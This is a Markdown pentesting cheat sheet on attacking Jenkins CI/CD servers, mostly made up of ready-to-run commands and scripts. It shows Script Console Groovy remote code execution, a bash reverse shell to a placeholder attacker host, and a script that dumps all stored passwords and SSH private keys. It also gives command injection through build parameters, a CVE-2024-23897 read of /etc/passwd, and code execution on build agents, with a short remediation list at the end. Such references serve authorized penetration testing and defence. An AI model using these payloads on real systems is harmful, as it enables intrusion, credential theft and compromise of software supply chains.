# Jenkins

> CI/CD orchestrator — extremely high-value target because it has the source code, build credentials, and deploy keys for everything in the SDLC. Authorized testing only. Map: also [../../cicd-supply-chain/](../../cicd-supply-chain/).

## TL;DR
- Five top paths: anonymous-read on `/jenkins/`, Script Console (admin → RCE), CLI deserialization CVEs (historical), plugin CVEs (large surface), credential dumping via Job XML.
- Default port 8080; default admin path `/manage`; `/script` (Script Console) is the Groovy REPL — RCE for any user with `Overall/Administer` or `Overall/RunScripts` permission.
- A compromised Jenkins almost always escalates to: source code, deploy keys, cloud credentials, container registry creds, signing keys — game over for the SDLC.
- Defence: authentication required on every endpoint; Matrix-based security with least-privilege; CSRF tokens on; plugin updates aggressive; agent/node separation.

## Detection / Discovery

### Fingerprint
```bash
curl -sI https://target:8080/ | grep -i x-jenkins
# X-Jenkins: 2.426.3   (version disclosure)

curl -s https://target/login | grep -i jenkins

curl -s https://target/asynchPeople/api/json | jq    # may require auth or be open
```

### Anonymous-read assessment
```bash
# Listing of jobs
curl -s https://target/api/json?tree=jobs%5Bname,url%5D | jq

# Admin-suggestive endpoints
for p in script manage configureSecurity people computer/api/json credentials/store/system/domain/_; do
  curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" "https://target/$p"
done
```

### Plugin inventory
```bash
curl -s https://target/pluginManager/api/json?depth=1 | jq -r '.plugins[] | "\(.shortName) \(.version)"'
# Cross-reference each against:
#   - jenkins.io security advisories: https://www.jenkins.io/security/advisories/
#   - NVD: https://nvd.nist.gov/vuln/search/results?form_type=Basic&search_type=all&query=jenkins
```

## Exploitation

### Script Console — Groovy RCE
Any user with `Overall/Administer` (or just `Overall/RunScripts` on older versions) can run Groovy at `/script`:
```bash
curl -sk -X POST -u admin:password https://target/script \
     --data-urlencode 'script=println "id".execute().text'
# Output: uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

Common follow-up: drop a reverse shell.
```groovy
def proc = ['bash','-c','bash -i >& /dev/tcp/<attacker>/<port> 0>&1'].execute()
proc.waitFor()
println proc.in.text
```

### Credential dumping from Script Console
```groovy
import jenkins.model.*
import hudson.security.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.plugins.credentials.domains.*

def store = SystemCredentialsProvider.getInstance().getStore()
store.getCredentials(Domain.global()).each { c ->
  println "${c.id} ${c.class.simpleName}"
  // For UsernamePasswordCredentialsImpl
  if (c instanceof UsernamePasswordCredentialsImpl) {
    println "  user=${c.username} pass=${c.password}"
  }
  // For SSHUserPrivateKey
  if (c instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey) {
    println "  user=${c.username}"
    println "  keys=${c.privateKeys}"
  }
}
```
This dumps usernames, passwords, SSH private keys, OAuth tokens — most credentials feed into deploy pipelines.

### CSRF + Script Console (historical, 2019-)
Pre-2.176 had Script Console accessible via POST with weak CSRF protection in some configurations. Modern Jenkins requires the CSRF crumb header for state-changing POSTs.

### Anonymous Job Build + parameterised build → RCE
If anonymous users have `Job/Build` + the job is parameterised with a `String` parameter that's interpolated into a shell step:
```bash
curl -sk "https://target/job/<jobname>/buildWithParameters?BRANCH=master%3B%20id%20"
# The job's shell step runs the injection.
```

### CLI deserialization (historical CVEs)
- CVE-2017-1000353 — Jenkins CLI bidirectional channel deserialization (pre-2.32.2).
- CVE-2018-1000861 — Stapler / CLI auth bypass.
- CVE-2019-1003000-class — Pipeline plugin sandbox escapes.
- CVE-2024-23897 — file-read primitive via Jenkins CLI (`@`-prefixed arg interpretation). PoC: https://github.com/binganao/CVE-2024-23897.

```bash
# CVE-2024-23897 example — read arbitrary file via @file syntax in `who-am-i`
java -jar jenkins-cli.jar -s http://target:8080/ -auth <user>:<token> who-am-i "@/etc/passwd"
```

### Plugin CVEs — sample categories
- File-upload plugins → arbitrary file write to webroot.
- Pipeline / Workflow Job / Workflow CPS → Groovy sandbox bypass → RCE.
- Active Directory / LDAP / SAML plugins → auth bypass.
- Github Pull Request Builder → SSRF / RCE on PR-comment-trigger.
Track at https://www.jenkins.io/security/advisories/ — Jenkins publishes weekly.

### Build node access from controller
Once controller is compromised, the build agents (`/computer/*`) often have:
- Active build workspaces with checked-out source.
- Credentials cached for the duration of a job.
- SSH keys to deploy targets.

```groovy
// From Script Console — list agents
Jenkins.instance.computers.each { c ->
  println "${c.name} - online=${!c.offline}"
}
// Run script on a specific agent
def remoteResult = Jenkins.instance.getComputer("agent-01").getChannel().call(new groovy.lang.Closure(null) {
  Object call() { return "id".execute().text }
})
println remoteResult
```

## Bypasses
- `/script` 403 for normal users but `/scriptText` returns plain text → check both.
- CSRF crumb required → fetch from `/crumbIssuer/api/json` then include in subsequent requests.
- Reverse proxy strips `/script` → try `/jenkins/script` (default basepath).

## Defence / Remediation
- **Authentication required**: Configure Global Security → "Logged-in users can do anything" only on internal-only Jenkins; otherwise Matrix-based security with named users.
- **Anonymous read = false**: in Global Security, uncheck "Allow anonymous read access".
- **Authorize ↔ Project-based / Matrix-based security**: `Overall/Read` only for general users; `Overall/Administer` for ops; never `Overall/RunScripts` for non-admins.
- **`Manage Plugins` weekly review** + auto-update for security advisories. Subscribe to https://www.jenkins.io/security/.
- **CSRF protection** on (default since 2.176; verify).
- **Script Console limited** to admins; consider disabling for non-emergency use.
- **Agent-to-controller subject to access control list** (Jenkins 2.319+). Limits compromised-agent → controller pivot.
- **Build isolation**: jobs run as a low-privilege OS user; build agents on separate VMs with no production access.
- **Credentials masking** in logs (default ON, but verify); never log secrets even masked.
- **OIDC / SAML auth** instead of local Jenkins users; MFA via the IdP.
- **Reverse proxy** with WAF in front; restrict `/script`, `/manage`, `/jnlpJars` to a management VLAN.
- **Backups** off-controller; encrypted; tested.

## Sources
- Jenkins Security Advisories: https://www.jenkins.io/security/advisories/
- Jenkins — Managing Security: https://www.jenkins.io/doc/book/security/
- HackTricks Jenkins: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/jenkins.html
- Orange Tsai — A New Era of SSRF (Jenkins examples): https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- PortSwigger — Jenkins research: https://portswigger.net/research (search jenkins)
- CVE-2024-23897 advisory: https://www.jenkins.io/security/advisory/2024-01-24/
- nuclei templates jenkins: https://github.com/projectdiscovery/nuclei-templates (search jenkins)
- jenkins-cli.jar reference: https://www.jenkins.io/doc/book/managing/cli/
